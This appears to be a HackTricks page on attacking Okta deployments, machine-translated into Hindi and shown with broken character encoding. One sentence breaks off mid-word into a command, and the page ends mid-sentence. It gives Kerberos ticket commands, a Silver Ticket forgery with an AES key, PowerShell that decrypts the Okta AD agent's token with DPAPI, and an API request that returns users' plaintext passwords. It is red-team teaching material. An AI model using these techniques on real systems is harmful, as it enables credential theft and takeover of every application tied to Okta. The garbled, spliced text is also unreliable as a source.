# Okta рд╕реБрд░рдХреНрд╖рд╛

<details>

<summary><strong>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ рдФрд░ рд▓рд╛рдн рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ!</strong></summary>

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ рдпрджрд┐ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** рдкрд░ рдлрд╝реЙрд▓реЛ рдХрд░реЗрдВ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ,** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред

</details>

## рдореВрд▓рднреВрдд рдЬрд╛рдирдХрд╛рд░реА

Okta, Inc. рдПрдХ **рдкрд╣рдЪрд╛рди рдФрд░ рдкрд╣реБрдБрдЪ рдкреНрд░рдмрдВрдзрди рдХрдВрдкрдиреА** рд╣реИ рдЬреЛ рдХрдВрдкрдирд┐рдпреЛрдВ рдХреЛ рдорджрд░реНрди рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рдкреНрд░рдмрдВрдзрд┐рдд рдФрд░ рд╕реБрд░рдХреНрд╖рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП** рдХреНрд▓рд╛рдЙрдб рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИ, рдФрд░ рдбреЗрд╡рд▓рдкрд░реНрд╕ рдХреЛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди, рд╡реЗрдм рд╕реЗрд╡рд╛рдУрдВ рдФрд░ рдЙрдкрдХрд░рдгреЛрдВ рдореЗрдВ рдкрд╣рдЪрд╛рди рдирд┐рдпрдВрддреНрд░рдг рдмрдирд╛рдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддреА рд╣реИред

рдЙрдирдХреА рдореБрдЦреНрдп рд╕реЗрд╡рд╛, рдЬрд┐рд╕реЗ Okta рдкрд╣рдЪрд╛рди рдврд╛рдВрдЪрд╛ рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ, рдореЗрдВрдЯреЗрдВрдб рд╕рд╛рдЗрди-рдСрди (SSO), рдмрд╣реБ-рдХрд╛рд░рдХ рдкреНрд░рдорд╛рдгреАрдХрд░рдг (MFA), рдЬреАрд╡рдирдЪрдХреНрд░ рдкреНрд░рдмрдВрдзрди, рд╕рд╛рд░реНрд╡рднреМрдорд┐рдХ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛, API рдкрд╣реБрдБрдЪ рдкреНрд░рдмрдВрдзрди, рдФрд░ рдЕрдзрд┐рдХ рдЬреИрд╕реЗ рдЙрддреНрдкрд╛рдж рд╢рд╛рдорд┐рд▓ рд╣реИрдВред рдЗрд╕рд╕реЗ рдХрдВрдкрдирд┐рдпреЛрдВ рдХреЛ рдЕрдкрдиреЗ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛ рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдХрд░рдиреЗ рдХреЗ рд╕рд╛рде-рд╕рд╛рде рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкрд╣реБрдБрдЪ рдХреЛ рд╕реБрдЧрдо рдмрдирд╛рдиреЗ рдореЗрдВ рднреА рдорджрдж рдорд┐рд▓рддреА рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдХрд░реНрдордЪрд╛рд░рд┐рдпреЛрдВ рдпрд╛ рдЧреНрд░рд╛рд╣рдХреЛрдВ рдХреЗ рд▓рд┐рдП рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдФрд░ рд╕реЗрд╡рд╛рдПрдВ рдЕрдзрд┐рдХ рдкрд╣реБрдБрдЪрдиреЗ рдФрд░ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдореЗрдВ рдЖрд╕рд╛рди рд╣реЛрддреА рд╣реИрдВред

Okta рдХреА рд╕реЗрд╡рд╛рдПрдВ рд╡реНрдпрд╛рдкрдХ рд░реВрдк рд╕реЗ рдЙрджреНрдпреЛрдЧреАрдп рд╕рдВрджрд░реНрднреЛрдВ рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рддреА рд╣реИрдВ, рд╕рд╛рде рд╣реА рдЫреЛрдЯреА рдХрдВрдкрдирд┐рдпреЛрдВ рдФрд░ рдбреЗрд╡рд▓рдкрд░реНрд╕ рджреНрд╡рд╛рд░рд╛ рднреАред рдпрд╣ рд╡реНрдпрд╛рдкрд╛рд░реЛрдВ рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рдврдВрдЧ рд╕реЗ рдХреНрд▓рд╛рдЙрдб рдкреНрд░реМрджреНрдпреЛрдЧрд┐рдХрд┐рдпреЛрдВ рдХреЛ рдЕрдкрдирд╛рдиреЗ рдФрд░ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рдиреЗ рдореЗрдВ рдорд╣рддреНрд╡рдкреВрд░реНрдг рднреВрдорд┐рдХрд╛ рдирд┐рднрд╛рддрд╛ рд╣реИред рдореЗрд░реЗ рдЬреНрдЮрд╛рди рдХреЗ рдЕрдиреБрд╕рд╛рд░ рд╕рд┐рддрдВрдмрд░ 2021 рдореЗрдВ, Okta рдкрд╣рдЪрд╛рди рдФрд░ рдкрд╣реБрдБрдЪ рдкреНрд░рдмрдВрдзрди (IAM) рдЙрджреНрдпреЛрдЧ рдореЗрдВ рдПрдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдЦрд┐рд▓рд╛рдбрд╝реА рдмрдирд╛ рд╣реБрдЖ рд╣реИред

{% hint style="danger" %}
Okta рдХрд╛ рдореБрдЦреНрдп рд▓рдХреНрд╖реНрдп рд╡рд┐рднрд┐рдиреНрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдФрд░ рд╕рдореВрд╣реЛрдВ рдХреЛ рдмрд╛рд╣рд░реА рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреЛрдВ рдХреА рдкрд╣реБрдБрдЪ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдирд╛ рд╣реИред рдпрджрд┐ рдЖрдк рдПрдХ Okta рдореЗрдВ **рдкреНрд░рд╢рд╛рд╕рдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рд╕рдВрдХреНрд░рдорд┐рдд** рдХрд░рдиреЗ рдореЗрдВ рд╕рдлрд▓ рд╣реЛрддреЗ рд╣реИрдВ, рддреЛ рдЖрдкрдХреЛ рдмрд╣реБрдд рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ рдХрд┐ рдЖрдк **рдХрдВрдкрдиреА рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛ рд░рд╣реА рд╕рднреА рдЕрдиреНрдп рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдореЛрдВ рдХреЛ рд╕рдВрдХреНрд░рдорд┐рдд** рдХрд░ рд╕рдХреЗрдВрдЧреЗред
{% endhint %}

{% hint style="success" %}
Okta рдорд╛рд╣реМрд▓ рдХреА рд╕реБрд░рдХреНрд╖рд╛ рд╕рдореАрдХреНрд╖рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ **рдкреНрд░рд╢рд╛рд╕рдХ рдХреЗрд╡рд▓ рдкрдврд╝рдиреЗ рдпреЛрдЧреНрдп рдкрд╣реБрдБрдЪ** рдХреЗ рд▓рд┐рдП рдкреВрдЫрдирд╛ рдЪрд╛рд╣рд┐рдПред
{% endhint %}

### рд╕рд╛рд░рд╛рдВрд╢

рдпрд╣рд╛рдВ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рд╣реЛрддреЗ рд╣реИрдВ (рдЬреЛ **Okta рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ**, рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП **рдкрд╣рдЪрд╛рди рдкреНрд░рджрд╛рддрд╛рдУрдВ** рд╕реЗ рд▓реЙрдЧ рдЗрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ **Active Directory** рдпрд╛ LDAP рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░рдорд╛рдгрд┐рдд рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ)ред \
рдЗрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ **рд╕рдореВрд╣реЛрдВ** рдореЗрдВ рд░рдЦрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред\
рдпрд╣рд╛рдВ рднреА **рдкреНрд░рдорд╛рдгреАрдХрд░рдгрдХрд░реНрддрд╛** рд╣реЛрддреЗ рд╣реИрдВ: рдкрд╛рд╕рд╡рд░реНрдб рдЬреИрд╕реЗ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд╡рд┐рднрд┐рдиреНрди рд╡рд┐рдХрд▓реНрдк рдФрд░ рд╡реЗрдмрдЖрдзрд╛рд░рд┐рдд 2FA, рдИрдореЗрд▓, рдлрд╝реЛрди, рдУрдХреНрдЯрд╛ рд╕рддреНрдпрд╛рдкрд┐рдд (рдпреЗ рд╕рдХреНрд╖рдо рдпрд╛ рдЕрдХреНрд╖рдо рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ)...

рдлрд┐рд░, Okta рдХреЗ рд╕рд╛рде **рд╕рд┐рдВрдХреНрд░рдирд╛рдЗрдЬрд╝ рдХреА рдЧрдИ рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреЗрдВ** рд╣реЛрддреА рд╣реИрдВред рдкреНрд░рддреНрдпреЗрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рдкрд╛рд╕ Okta рдХреЗ рд╕рд╛рде рдХреБрдЫ **рдореИрдкрд┐рдВрдЧ** рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рд╕рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рд╕рд╛рдЭрд╛ рдХреА рдЬрд╛рддреА рд╣реИ (рдЬреИрд╕реЗ рдИрдореЗрд▓ рдкрддреЗ, рдкрд╣рд▓реЗ рдирд╛рдо рдЖрджрд┐)ред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдкреНрд░рддреНрдпреЗрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдПрдХ **рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдиреАрддрд┐** рдХреЗ рдЕрдВрджрд░ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП, рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП **рдЖрд╡рд╢реНрдпрдХ рдкреНрд░рдорд╛рдгреАрдХрд░рдгрдХрд░реНрддрд╛** рдХреЛ **рдкрд╣реБрдБрдЪ** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрдВрдЧрд┐рдд рдХрд░рддреА рд╣реИред

{% hint style="danger" %}
рд╕рдмрд╕реЗ рд╢рдХреНрддрд┐рд╢рд╛рд▓реА рднреВрдорд┐рдХрд╛ **рд╕реБрдкрд░ рдкреНрд░рд╢рд╛рд╕рдХ** рд╣реИред

рдпрджрд┐ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ Okta рдХреЛ рдкреНрд░рд╢рд╛рд╕рдХ рдкрд╣реБрдБрдЪ рдХреЗ рд╕рд╛рде рд╕рдВрдХреНрд░рдорд┐рдд рдХрд░рддрд╛ рд╣реИ, рддреЛ рд╕рднреА **Okta рдкрд░ рднрд░реЛрд╕рд╛ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдРрдкреНрд╕** рдХреЛ рдмрд╣реБрдд рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ рдХрд┐ рд╕рдВрдХреНрд░рдорд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред
{% endhint %}

## рд╣рдорд▓реЗ

### Okta рдкреЛрд░реНрдЯрд▓ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛

рдЖрдорддреМрд░ рдкрд░ рдХрдВрдкрдиреА рдХрд╛ рдкреЛрд░реНрдЯрд▓ **companyname.okta.com** рдкрд░ рд╕реНрдерд┐рдд рд╣реЛрдЧрд╛ред рдпрджрд┐ рдРрд╕рд╛ рдирд╣реАрдВ рд╣реИ, рддреЛ **companyname** рдХреЗ рд╕
```bash
getST.py -spn HTTP/clientname.kerberos.okta.com -dc-ip 1.2.3.4 LAB/comprommiseduser
```
рдПрдбреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдкреНрд░рд╛рдкреНрдд рдЯрд┐рдХрдЯ рдХреЗ рд╕рд╛рде, рд╣рдореЗрдВ Rubeus рдпрд╛ Mimikatz рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣рдорд╛рд░реЗ рдирд┐рдпрдВрддреНрд░рдг рдореЗрдВ рд╣реЛрд╕реНрдЯ рдкрд░ рдЗрд╕реЗ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ:

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

рдЖрдкрдХреЛ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдХрд┐ `clientname.kerberos.okta.com` рдХреЛ рдЗрдВрдЯрд░рдиреЗрдЯ рд╡рд┐рдХрд▓реНрдкреЛрдВ рдореЗрдВ "рдЗрдВрдЯреНрд░рд╛рдиреЗрдЯ" рд╕реБрд░рдХреНрд╖рд╛ рдХреНрд╖реЗрддреНрд░ рдореЗрдВ рдЬреЛрдбрд╝рд╛ рдЧрдпрд╛ рд╣реИред рдФрд░ рдлрд┐рд░, рд╣рдорд╛рд░реЗ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдореЗрдВ, рдпрджрд┐ рд╣рдо рдиреАрдЪреЗ рджрд┐рдП рдЧрдП URL рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рд╣рдореЗрдВ рдПрдХ JSON рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдкреНрд░рд╛рдкреНрдд рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП рдЬреЛ рдХреЗрд░рдмреЗрд░реЛрд╕ рдЯрд┐рдХрдЯ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдиреЗ рдкрд░ рдПрдХ `OK` рдкрд░рд┐рдгрд╛рдо рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИ:

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

Okta рдбреИрд╢рдмреЛрд░реНрдб рдкрд░ рдЬрд╛рддреЗ рд╣реБрдП, рдпрджрд┐ рд╕рдм рдХреБрдЫ рдареАрдХ рд╣реИ, рддреЛ рдЖрдк рд╕рд╛рдЗрди рдЗрди рд╣реЛ рдЬрд╛рдПрдВрдЧреЗред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдпрджрд┐ рд╣рдо рд╡рд╛рд╕реНрддрд╡рд┐рдХ Okta рд╕реЗрд╡рд╛ рдЦрд╛рддрд╛ рдХреЛ рд╕рдВрдХрд▓реНрдкрдирд╛ SPN рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░рдХреЗ рдХрдВрдкреНрд░рдорд╛рдЗрдЬрд╝ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рд╣рдо рдПрдХ Silver Ticket рд╣рдорд▓рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдпрд╣ рдзреНрдпрд╛рди рджреЗрдиреЗ рдпреЛрдЧреНрдп рд╣реИ рдХрд┐ Okta рдХреЗрд╡рд▓ рдЯрд┐рдХрдЯ рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдХреЗ рд▓рд┐рдП AES рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рд╣рдореЗрдВ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдХрд┐ рд╣рдорд╛рд░реЗ рдкрд╛рд╕ AES рдХреБрдВрдЬреА рдпрд╛ рд╕рд╛рджрд╛ рдкрд╛рд╕рд╡рд░реНрдб рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╣реИ:

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

рдкреАрдбрд╝рд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ `testuser` рдХреЗ рд▓рд┐рдП рд╣рдорд╛рд░рд╛ рдЯрд┐рдХрдЯ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдо рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░рддреЗ рд╣реИрдВ:

{% code overflow="wrap" %}
```bash
ticketer.py -domain-sid S-1-5-21-4170871944-1575468979-147100471 -domain lab.local -dc-ip DC01 -aesKey db22ab9c89f2f0d545024f9dfabbed44173397065d8f5b7e172200ca38ed4393 -user-id 1118 -spn HTTP/example.kerberos.okta.com testuser
```
{% endcode %}

рдФрд░ рдлрд┐рд░, рдЗрд╕реЗ рд╣рдорд╛рд░реЗ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рд╕рддреНрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдУрдХреНрдЯрд╛ рдХреЛ рднреЗрдЬреЗрдВ:

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

### Okta AD рдПрдЬреЗрдВрдЯ рдХреЛ рд╣рд╛рдЗрдЬреИрдХ рдХрд░рдирд╛

(рд╣рдорд▓рд╛ [**рдпрд╣рд╛рдВ рд╕реЗ**](https://trustedsec.com/blog/okta-for-red-teamers) рдХреЙрдкреА рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ).

рдпрджрд┐ рдЖрдк рдУрдХреНрдЯрд╛ рдПрдбреА рдПрдЬреЗрдВрдЯ рдЪрд▓рд╛рдиреЗ рд╡рд╛рд▓реЗ рд╕рд░реНрд╡рд░ рддрдХ рдкрд╣реБрдВрдЪрддреЗ рд╣реИрдВред рдпрд╣ рдПрдЬреЗрдВрдЯ рдбреЛрдореЗрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдФрд░ рд╕рдореВрд╣реЛрдВ рдХреЛ рдУрдХреНрдЯрд╛ рдореЗрдВ рдкреНрд░реЛрд╡рд┐рдЬрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рдкреЛрд░реНрдЯрд▓ рдореЗрдВ рд▓реЙрдЧ рдЗрди рдХрд░рддреЗ рд╕рдордп рдУрдХреНрдЯрд╛ рд╕реЗ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЕрдиреБрд░реЛрдзреЛрдВ рдХрд╛ рдЬрд╡рд╛рдм рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдЬрд┐рдореНрдореЗрджрд╛рд░ рд╣реЛрддрд╛ рд╣реИред

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, рдПрдЬреЗрдВрдЯ рдЗрдВрд╕реНрдЯреЙрд▓ рд╣реЛрддрд╛ рд╣реИ:
```bash
C:\Program Files (x86)\Okta\Okta AD Agent
```
рд╣рдо `OktaAgentService.exe.config` рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВрдЧреЗ, рдЬрд┐рд╕рдореЗрдВ рдХреБрдЫ XML рдХреЗ рджрд┐рд▓рдЪрд╕реНрдк рд╣рд┐рд╕реНрд╕реЗ рд╣реИрдВ:

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Base64 рдХреЛрдб рдХрд┐рдпрд╛ рдЧрдпрд╛ `AgentToken` рд╣рдорд╛рд░реЗ рд▓рдХреНрд╖реНрдп рдХрд╛ рд╕реНрдерд╛рди рд╣реИред рдпрджрд┐ рд╣рдо `OktaAgentService.exe` рдХреЛ dnSpy рдореЗрдВ рдЦреЛрд▓реЗрдВ, рддреЛ рд╣рдо рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдпреЗ рдорд╛рди рдХреИрд╕реЗ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рд╣реЛрддреЗ рд╣реИрдВ:

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

рд╣рд╛рдБ.. рдпрд╣реА рд╣реИ.. рдЕрдЪреНрдЫрд╛ рдкреБрд░рд╛рдирд╛ DPAPI! `RandomEntropy` рдорд╛рди рдХреЛ рдПрдХ рдорд╛рди рдХреЗ рд░реВрдк рдореЗрдВ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рд╣рдо рдЗрд╕ Base64 рдХреЛрдб рдХрд┐рдП рдЧрдП XML рдорд╛рди рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ:
```powershell
Add-Type -AssemblyName 'System.Security'
$rand = [byte]174,53,167,191,10,250,125,232,223,147,248,86,65

$k = [System.Security.Cryptography.ProtectedData]::Unprotect([System.Convert]::FromBase64String("AQAAANCMnd8BFdERjH..."), $rand, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
[System.Text.Encoding]::Unicode.GetString($k)
```
рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ DPAPI рдорд╛рд╕реНрдЯрд░ рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ "Okta AD рдПрдЬреЗрдВрдЯ" рд╕реЗрд╡рд╛ рдЪрд▓рд╛рдиреЗ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддреЗ рдХрд╛ рд╣реЛрддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЖрдкрдХреЛ рд╕реЗрд╡рд╛ рдЦрд╛рддреЗ рдХреЗ рд╕рдВрджрд░реНрдн рдореЗрдВ рдКрдкрд░ рджрд┐рдП рдЧрдП рдХреЛрдб рдХреЛ рдЪрд▓рд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА, рдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддреЗ рдХреЗ рд▓рд┐рдП рдорд╛рд╕реНрдЯрд░ рдХреБрдВрдЬреА рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ рдФрд░ рдЗрд╕реЗ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░реЗрдВ:

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, `OktaAgentService.exe.config` рдХреЗ рднреАрддрд░ рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рджреЛ рдЕрддрд┐рд░рд┐рдХреНрдд XML рдлрд╝реАрд▓реНрдб рд╣реЛрддреЗ рд╣реИрдВ, `APPID` рдФрд░ `AGENTID`. `AgentToken` рдХреЗ рд╕рд╛рде рдорд┐рд▓рд╛рдХрд░, рд╣рдо рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд░реВрдк рдореЗрдВ рдПрдХ `GET` рдЕрдиреБрд░реЛрдз рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```xml
GET /api/1/internal/app/activedirectory/[APPID]/agent/[AGENTID]/nextAction?agentVersion=1&pollid=anything HTTP/1.1
Host: client.okta.com
Authorization: SSWS 00OfIl_Gi1rZu1NETmHo6auU6YZEOEn8ZlDhyqstiZ
```
рдпрд╣ рдХреЙрд▓ рдЙрд╕ рд╕рдордп рддрдХ рдмреНрд▓реЙрдХ рдХрд░реЗрдЧрд╛ рдЬрдм рддрдХ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ Okta рдореЗрдВ рдкреНрд░рдорд╛рдгрд┐рдд рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ (рдпрд╛ рдЕрдиреБрд░реЛрдз рдХрд╛ рд╕рдордп рд╕рдорд╛рдкреНрдд рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ), рдЬрд┐рд╕рдХреЗ рдмрд╛рдж рдпрд╣ рд╕реНрдкрд╖реНрдЯ рдкрд╛рда рдореЗрдВ рдЕрдЧрд▓реЗ рдкреНрд░рджрд╛рди рдХрд┐рдП рдЧрдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ рд▓реМрдЯрд╛рдПрдЧрд╛:
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<action>
<UserAuth actionId="rpc::app.active_directory.agent.reply.ok14-majorecs02a.auw2-ok14.internal//1670637714886//Y5PojoeQQ3KDgHHzA11P9wAAC8g:e9088489-99ff-435a-943b-b7dccc457cb5:">
<type>USER_AUTH</type>
<password>abc123</password>
<useLdapGroupPasswordPolicy>false</useLdapGroupPasswordPolicy>
<userName>domuser@lab.local</userName>
</UserAuth>
</action>
```
рдпрд╣ рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдХрд┐ рд╣рдо рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░реЗрдВ, рд╣рд╛рд▓рд╛рдВрдХрд┐ рд╣рдореЗрдВ рдЗрд╕ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рдпрд╛рд╕ рдХрд╛ рдЬрд╡рд╛рдм рджреЗрдиреЗ рдХрд╛ рднреА рдЕрд╡рд╕рд░ рд╣реЛрддрд╛ рд╣реИ рдЕрдЧрд░ рд╣рдо рдХреБрдЫ рдРрд╕рд╛ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдЬреИрд╕реЗ рдХрд┐ рдПрдХ рд╕реНрдХреЗрд▓реЗрдЯрди рдХреБрдВрдЬреА рдкреНрд░рджрд╛рди рдХрд░рдирд╛ред рд╣рдо рдЗрд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд HTTP 